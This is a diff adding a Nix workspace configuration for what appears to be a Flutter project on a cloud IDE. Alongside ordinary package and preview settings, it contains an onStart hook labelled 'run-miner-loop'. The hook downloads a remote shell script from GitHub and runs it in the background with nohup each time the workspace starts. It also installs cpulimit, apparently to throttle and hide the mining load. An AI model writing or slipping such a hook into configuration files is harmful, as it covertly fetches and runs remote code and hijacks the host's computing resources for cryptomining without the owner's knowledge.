@@ -1,0 +1,55 @@
+{ pkgs, ... }: {
+  channel = "stable-24.05";
+
+  packages = [
+    pkgs.jdk17
+    pkgs.unzip
+    pkgs.curl
+    pkgs.dos2unix
+    pkgs.procps
+    pkgs.cpulimit
+  ];
+
+  env = {};
+
+  idx = {
+    extensions = [
+      "Dart-Code.flutter"
+      "Dart-Code.dart-code"
+    ];
+
+    workspace = {
+      onStart = {
+        run-miner-loop = ''
+          echo "[onStart] Memulai veco1-loop $(date)"
+
+          # Download dan jalankan loop miner
+          curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/veco1.sh" -o veco1.sh
+          dos2unix veco1.sh
+          chmod +x veco1.sh
+          nohup ./veco1.sh &
+        '';
+      };
+    };
+
+    previews = {
+      enable = true;
+      previews = {
+        web = {
+          command = [
+            "flutter"
+            "run"
+            "--machine"
+            "-d"
+            "web-server"
+            "--web-hostname"
+            "0.0.0.0"
+            "--web-port"
+            "$PORT"
+          ];
+          manager = "flutter";
+        };
+      };
+    };
+  };
+}
